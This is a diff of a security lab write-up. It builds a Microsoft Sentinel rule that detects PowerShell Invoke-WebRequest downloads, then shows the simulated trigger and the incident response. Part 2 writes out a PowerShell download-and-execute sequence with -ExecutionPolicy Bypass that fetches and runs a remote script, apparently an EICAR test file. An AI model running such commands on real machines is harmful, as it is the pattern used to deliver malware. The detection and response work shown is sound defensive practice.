@@ -294,6 +294,7 @@ authentication occurred and no system compromise was identified.
 
 
 ---
+---
 
 
 # Scenario 2: PowerShell Suspicious Web Request
@@ -328,13 +329,13 @@ Detect PowerShell usage of `Invoke-WebRequest` to download remote content and in
 #### Analytics rule details
 <img width="1371" height="1219" alt="image" src="https://github.com/user-attachments/assets/9521c773-1741-419f-bfc6-de782af06928" />
 
----
+
 
 #### Mittre Attack: 
 <img width="1247" height="468" alt="image" src="https://github.com/user-attachments/assets/00984eda-6682-475d-85f1-e8c45e44bc00" />
----
 
-### Detection (KQL)
+
+### Detection Query 
 Design a Sentinel Scheduled Query Rule within Log Analytics that will discover when PowerShell is detected using Invoke-WebRequest to download content.
 
 ```kql
@@ -350,18 +351,81 @@ DeviceProcessEvents
     InitiatingProcessFileName,
     InitiatingProcessCommandLine 
 ```
----
-### View query results:
 
-<img width="2182" height="684" alt="image" src="https://github.com/user-attachments/assets/49b20701-eb35-4a11-87cf-c080ccd57379" />
 
----
-#### Entity Mapping 
+
+#### Entity Mapping Configuration
 <img width="1261" height="726" alt="image" src="https://github.com/user-attachments/assets/ed99440e-9bcb-4d92-b29b-7e67de7c729a" />
 
 
+## Part 2: Trigger Alert to Create Incident
+
+#### Attack Simulation on VM
+##### Executed Commands:
+
+```
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
+
+powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
+```
+
+<img width="2413" height="646" alt="image" src="https://github.com/user-attachments/assets/c109c781-2104-4aa2-8a86-b3e02f20c13e" />
 
 
+#### Log Verification in Sentinel
+
+<img width="2182" height="684" alt="image" src="https://github.com/user-attachments/assets/49b20701-eb35-4a11-87cf-c080ccd57379" />
 
 
+## Part 3: Work Incident
 
+### Preparation
+
+Incident assigned to SOC Analyst (Myself).
+Followed NIST SP 800-61 Incident Response Lifecycle.
+All findings documented inside Sentinel incident notes.
+
+<img width="1195" height="1198" alt="image" src="https://github.com/user-attachments/assets/3e412fd4-285c-4ba4-8ab4-5034d6aae5ba" />
+
+### Detection and Analysis
+- The incident, labeled “PowerShell Suspicious Web Request”, was triggered on lamavmonboardin by a single user.
+- During investigation, it was identified that multiple PowerShell commands were executed, resulting in the download and execution of one script.
+
+#### PowerShell Commands Executed:
+1.
+``` powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\programdata\eicar.ps1 ```
+
+2.
+``` powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1 ```
+
+##### Incident Details
+
+- Device Affected: lamavmonboardin
+- User Involved: lama
+- Number of Scripts Downloaded: 1
+- Event Trigger: Suspicious PowerShell web request detected by Sentinel analytics rule
+During review, the user reported attempting to install free software at approximately the same time the events occurred.
+
+#### Investigation and Findings 
+Using Microsoft Defender for Endpoint, it was confirmed that the downloaded script was executed on the device.
+The query confirmed:
+
+<img width="2191" height="576" alt="image" src="https://github.com/user-attachments/assets/b524e8b3-8d5b-4de8-927b-36d0de8bf7dd" />
+
+###### The query confirmed:
+- Script execution occurred.
+- Execution was performed by user account lama.
+- Execution followed immediately after script download.
+- No additional scripts were identified as executed.
+  
+### Containment, Eradication & Recovery
+- The affected machine was isolated using Microsoft Defender for Endpoint.
+- An anti-malware scan was conducted on the isolated machine.
+- The scan returned clean results.
+- Once confirmed safe, the machine was removed from isolation and restored to normal operations.
+
+### Post-Incident Activities
+
+### Closure
+
+<img width="866" height="964" alt="image" src="https://github.com/user-attachments/assets/dee2d2e5-f084-4169-9141-2d85a6c0e0af" />
